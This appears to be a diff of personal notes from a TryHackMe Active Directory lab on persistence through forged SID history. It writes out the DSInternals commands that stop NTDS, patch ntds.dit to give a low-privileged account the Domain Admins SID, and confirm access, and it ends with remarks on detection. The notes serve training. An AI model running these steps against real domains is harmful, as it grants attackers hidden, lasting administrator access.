@@ -1,0 +1,55 @@
+SIDs are used to track the security principal and the account's access when connecting to resources. 
+There is, however, an interesting attribute on accounts called the SID history.
+
+performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. 
+In the new domain, the user would have a new SID, but we can add the user's existing SID in the SID history,
+
+While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence.
+
+
+####History Can Be Whatever We Want It To Be:
+The thing is, SID history is not restricted to only including SIDs from other domains. 
+With the right permissions, we can just add a SID of our current domain to the SID history of an account we control
+
+####Forging History:
+    Windows Low Privilege Account Terminal:
+        powershell
+        Get-ADUser <your ad username> -properties sidhistory,memberof  <-- Check if there is not SIDHistory
+        exit from user account
+
+
+    Admin Windows Terminal SID History:
+        powershell
+        Get-ADGroup "Domain Admins"
+
+        We will use the DSInternals tools to directly patch the ntds.dit file, the AD database where all information is stored:
+            Stop-Service -Name ntds -force
+            Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
+            Start-Service -Name ntds
+
+            *The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. 
+            We must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore
+
+
+        Windows Low Privilege Account Terminal:
+            powershell
+            Get-ADUser aaron.jones -Properties sidhistory
+            dir \\thmdc.za.tryhackme.loc\c$  <--- Change domainName
+            Mode LastWriteTime Length Name 
+            ---- ------------- ------ ---- 
+            d----- 9/15/2018 8:19 AM PerfLogs 
+            d-r--- 5/11/2022 10:32 AM Program Files 
+            d----- 3/21/2020 8:28 PM Program Files (x86) 
+            d----- 4/25/2022 7:13 PM tmp 
+            da---- 5/11/2022 10:11 AM Tools 
+            d-r--- 4/27/2022 8:22 AM Users 
+            d----l 4/25/2022 7:11 PM vagrant 
+            d----- 4/27/2022 8:12 PM Windows 
+            -a---- 1/4/2022 7:47 AM 103 delete-vagrant-user.ps1 
+            -a---- 5/1/2022 9:11 AM 169 dns_entries.csv 
+            -a---- 5/1/2022 9:17 AM 1725 thm-network-setup-dc.ps1
+Based on the output above, that worked! We were able to forge our SID History, granting our low-privileged account DA access!
+
+If you were to RDP into one of the hosts and use the AD Users and Groups snap-in, you would be able to view the SID history attribute added to your user. However, even with the highest possible privileges, you would not be able to remove the attribute since it is protected. In order to remove this, you would have to use tools such as the AD-RSAT PowerShell cmdlets to remove SID history.
+
+However, before you can even think about removing malicious SID history attributes, you first need to find them. None of the regular tools will tell you that something is wrong. That user will not all of a sudden pop up as a member of the Domain Admins group. So unless you are actively filtering through the attributes of your users, this is incredibly hard to find. This is because the SID history is only applied and used once the user authenticates.
